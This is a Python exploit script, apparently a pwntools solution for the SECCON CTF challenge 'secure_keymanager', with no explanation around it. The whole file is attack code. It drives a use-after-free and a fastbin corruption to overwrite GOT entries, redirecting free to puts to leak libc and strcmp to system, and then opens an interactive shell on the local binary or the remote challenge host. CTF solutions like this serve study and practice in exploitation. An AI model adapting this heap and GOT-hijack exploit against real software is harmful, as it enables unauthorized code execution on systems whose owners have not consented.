#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './secure_keymanager'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()
if not args['ASLR']:
    context.aslr = False
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = libc
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
libc = ELF(libc)

def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('secure_keymanager.pwn.seccon.jp', 47225)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def send_account():
        io.sendafter('>>', '/bin/sh\0')
        io.sendafter('>>', 'pass\0')

    def add_key(data, length=None, title='\0'):
        io.sendlineafter('>>', 1)
        if length is None:
            length = len(data) + 1
        io.sendlineafter('...', length)
        io.sendafter('...', title)
        io.sendafter('...', data)

    def edit_key(idx, data):
        io.sendlineafter('>>', 3)
        send_account()
        io.sendlineafter('...', idx)
        io.sendafter('...', data)

    def remove_key(idx):
        io.sendlineafter('>>', 4)
        send_account()
        io.sendlineafter('...', idx)

    send_account()

    # create UAF key 1
    add_key(cyclic(0x100))
    add_key(cyclic(0x100))
    add_key(cyclic(0x100))
    remove_key(0)
    remove_key(1)
    remove_key(2)
    add_key(cyclic(0x230)) # idx 0
    add_key(cyclic(0x800)) # idx 1
    remove_key(2)

    # generate target freed fastbin
    remove_key(0)
    add_key(fit({
        0x238: 0x201, # increase chunk size for key 1
    }, length=0x300)) # idx 0
    add_key(cyclic(0x30)) # idx 2, target fastbin
    add_key(cyclic(1), length=0x10) # idx 3
    add_key(cyclic(1), length=0x400) # idx 4
    add_key(cyclic(0x20))
    remove_key(4)
    remove_key(3)
    remove_key(2)

    # modify `next` for freed fastbin
    edit_key(1, fit({
        0xa8: 0x61,
        0xb0: elf.got['free'] - 0x1e,
        0x108: 0x41,
        0x110: elf.got['__stack_chk_fail'] - 0x6,
    }))

    # hijack `free` to `puts`
    add_key(cyclic(0x30))
    add_key('A', length=0x31, title=fit({
        0xe: elf.plt['puts'],
    })[:-1])

    # leak libc address
    remove_key(4)
    libc.address = unpack(io.recvline(keepends=False), 'all') - libc.symbols['__malloc_hook'] - 0x68
    log.info('libc base address: %#x', libc.address)

    # hijack `strcmp` to `system`
    add_key(cyclic(0x10))
    payload = p64(libc.symbols['read'])[2:]
    payload += p64(libc.symbols['__libc_start_main'])
    payload += p64(libc.symbols['system'])[:-1]
    add_key(payload, length=0x18)

    io.sendlineafter('>>', 4)
    io.sendafter('>> ', 'get shell')

    io.interactive()

if __name__ == '__main__':
    exploit()
